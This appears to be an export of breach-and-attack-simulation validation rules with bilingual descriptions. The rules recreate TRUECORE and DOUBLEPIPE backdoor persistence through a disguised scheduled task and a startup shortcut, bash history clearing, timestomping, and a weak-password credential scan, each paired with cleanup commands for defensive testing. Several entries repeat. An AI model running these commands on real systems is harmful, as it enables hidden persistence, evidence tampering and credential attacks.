mklink "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WordPress.lnk" "C:\Windows\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\accicons.exe"
  auto,4,true,60
  success_match:symbolic link created

del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WordPress.lnk"
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a TRUECORE sample that creates a scheduled task for persistence. The task name varies depending on whether TRUECORE has detected a specific AV product on the host. This validation rule simulates a scheduled task created when TRUECORE did not find the AV software it was searching for. The success criterion is the successful creation of planned tasks. TRUECORE is a backdoor program written in C and compiled for Windows environments that communicate through HTTP. The features of this malware include screenshots, persistence through scheduled tasks, and system and network enumeration. TRUECORE can also download and execute location independent code, batch scripts, PE format executable files, and PowerShell commands.

host_cli_action.raw_text:
schtasks /create /sc ONLOGON /tn NvTmRep_CrashReport3_{B2FE1952-0186-46H3-BAHC-A80AA35AH5B8} /tr "C:\Windows\SysWOW64\rundll32.exe C:\Users\Public\Documents\TRUECORE.dll,#1" /f
  auto,8,true,60
  success_match:success

schtasks /delete /tn NvTmRep_CrashReport3_{B2FE1952-0186-46H3-BAHC-A80AA35AH5B8} /f
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates a establishment of persistence on infected hosts by adding a shortcut to the Windows startup folder to execute DOUBLEPIPE at system startup. DOUBLEPIPE is a backdoor written in C/C++ that communicates through HTTP. The supported commands include file transfer, file execution, shell command execution, process enumeration, and process termination. Doublepipe has been observed to have been maliciously induced to drop files targeting Korean language users.

host_cli_action.raw_text:
mklink "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WordPress.lnk" "C:\Windows\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\accicons.exe"
  auto,4,true,60
  success_match:symbolic link created

del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WordPress.lnk"
  auto,4,true,60
  cleanup
# Put cleanup here (optional):
# cleanup command 1
#  auto,4,true,3
#  cleanup

此验证动作还原了一个攻击者删除终端会话历史保存的命令。当通过命令行执行命令时，它们将存储在会话的历史记录中。会话终止后，命令将写入磁盘的 .bash\_history 中。

注意：此验证动作被视为“弱信号”操作。这意味着它展示的行为并不总是表示恶意活动，并且可以匹配合法用户或管理活动。当您单独运行弱信号操作时，它不太可能被安全产品阻止。最佳实践是确保您的安全产品提供对此类行为的可见性。这使您可以将活动与更高保真度的信号关联起来以进行检测或用于威胁搜寻。

This validation rule simulates an adversary command to delete terminal session history saved. When commands are executed through the command line, they will be stored in the history of the session. After the session terminates, the command will be written to the .bash\_history on the disk.
APT Threat Groups have used this Defense Evasion technique to conceal their tracks on infected hosts. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious activity and can match legitimate users or manage activities. When you run a weak signal operation alone, it is unlikely to be blocked by Security Controls. The best practice is to ensure that your Security Controls provide visibility into such behavior. This allows you to associate activities with higher fidelity signals for detection or for threat hunting.

exact_source_fields.desc: This validation rule simulates a .bash\_history file on the cleared device. .bash\_history contains commands executed from the command line after exiting the shell. Adversary may clear the contents of files as a way to hide their traces on the system. There are multiple methods to erase .bash\_history. Although this method will delete the content of the file, it is not as secretive as people imagine. After the user exits the bash shell, commands issued during the session will be written to the .bash\_history file. If someone wants to view its content, they will clearly see that someone has tampered with it. Adversary has used this Defense Evasion technique to cover up their tracks on infected hosts. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious activity and can match legitimate users or manage activities. When you run a weak signal operation alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate activities with higher fidelity signals for detection or for threat hunting. Note: Running this validation rule will completely delete the bash history. There are no commands or cleanup commands to preserve the contents of the file.

exact_source_fields.action_description:
此验证动作还原了攻击者使用 Linux 命令“touch”来修改文件时间戳，这种技术称为时间标记。 Timestomping 是一种反取证技术，被攻击者用来在目录中的其他文件中伪装可疑文件，或者使文件看起来从未被访问或修改过。 该技术可用于尝试在受到攻击后更改事件的时间线。

此验证动作将创建一个新文件，显示未修改的时间戳，更改系统时间，更改访问、修改和更改时间戳，并显示修改的时间。 该文件将被删除，系统时间将通过操作清理恢复。

exact_source_fields.desc: This validation rule simulates adversary's use of the Linux command "touch" to modify file timestamps, a technique known as timestamp. Timestamping is an anti forensics technique used by adversary to disguise suspicious files in other files in a directory, or to make files appear to have never been accessed or modified. This technology can be used to attempt to change the timeline of events after being attacked. This validation rule will create a new file that displays an unmodified timestamp, changes the system time, changes access, modification, and change timestamps, and displays the modified time. The file will be deleted and the system time will be cleared and restored through operation.

host_cli_action.raw_text:
echo test > hello.txt
  auto,4,true,60
  success_zero

stat hello.txt
  auto,4,true,60
  success_zero

NOW=$(date)
  auto,4,true,60
  success_zero

date -s "1980-01-01 00:00:00"
  auto,4,true,60
  success_zero
  
touch hello.txt
  auto,4,true,60
  success_zero

stat hello.txt
  auto,4,true,60
  success_zero
  
date -s "$NOW"
  auto,4,true,60
  cleanup

rm -f hello.txt
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates the use of self-developed tools for weak password detection, which will determine which services or ports have valid weak passwords. If a valid weak password credential is found, the username and password will be reported to the adversary, who can then use adversary to access the target victim and assist with lateral movement in the network. Currently supported: SSH, SMB, RDP, FTP, MySQL, MSSQL, Redis, PSQL, Oracle, etc.

host_cli_action.raw_text:
C:\Users\Public\Documents\{{v_action_id}}\weak_password.exe -ip {{v_scan_ip}}  > C:\Users\Public\Documents\{{v_action_id}}\weak_password.txt && type C:\Users\Public\Documents\{{v_action_id}}\weak_password.txt
rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.name: Host Command Line - Login weak password detection
exact_source_fields.notes: Digidations recommends running this rule on Windows 10, Windows Server 2016 Validator as a non-administrator, administrator, or system user.

exact_source_fields.desc: This validation rule simulates the use of self-developed tools for weak password detection, which will determine which services or ports have valid weak passwords. If a valid weak password credential is found, the username and password will be reported to the adversary, who can then use adversary to access the target victim and assist with lateral movement in the network. Currently supported: SSH, SMB, RDP, FTP, MySQL, MSSQL, Redis, PSQL, Oracle, etc.

host_cli_action.raw_text:
C:\Users\Public\Documents\{{v_action_id}}\weak_password.exe -ip {{v_scan_ip}}  > C:\Users\Public\Documents\{{v_action_id}}\weak_password.txt && type C:\Users\Public\Documents\{{v_action_id}}\weak_password.txt
rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.name: Host Command Line - Login weak password detection
exact_source_fields.notes: Digidations recommends running this rule on Windows 10, Windows Server 2016 Validator as a non-administrator, administrator, or system user.
